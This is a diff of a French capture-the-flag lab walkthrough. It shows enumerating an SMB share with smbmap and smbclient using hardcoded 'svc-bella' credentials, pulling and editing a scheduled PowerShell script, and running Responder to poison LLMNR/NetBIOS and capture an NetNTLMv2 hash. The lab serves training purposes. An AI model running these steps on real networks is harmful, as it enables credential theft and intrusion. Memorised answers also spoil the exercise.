@@ -244,21 +244,21 @@ Grace a toutes ces informations tu peux par exemple t'interesser au partage samb
 
 Attaque : 
 
-smbmap -H "10.100.0.111" -d bellagio.com -u 'svc-bella' -p 'P@ssw0rd'
+smbmap -H "10.100.0.111" -d bellagio.local -u 'svc-bella' -p 'P@ssw0rd'
 
 Lire le fichier de log et le pentester ce rend compte que toutes les 5min un utilisateur se connecte et execute un script toutes les 5 minutes (taches planifiées) 
 
 smbclient //10.100.0.111/script -U 'bellagio\svc-bella%P@ssw0rd'
 
+get 111_script_smb.ps1
+
 Modifier le nom de domaine dans le fichier du script 111_script_smb.ps1
 
 Lancer responder qui empoisonnera les réponses LLMNR Netbios et qui récupèrent le hash du compte. 
 
-responder -i ens18
+responder -i ens18 
 
-Voici une idée de flag, basé sur le hash NetNTLMv2 capturé :
-
-Flag (à soumettre) username + password du compte sous ce format username:password (ex avec toto et password = toto:password)
+Flag :
 
 
 --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
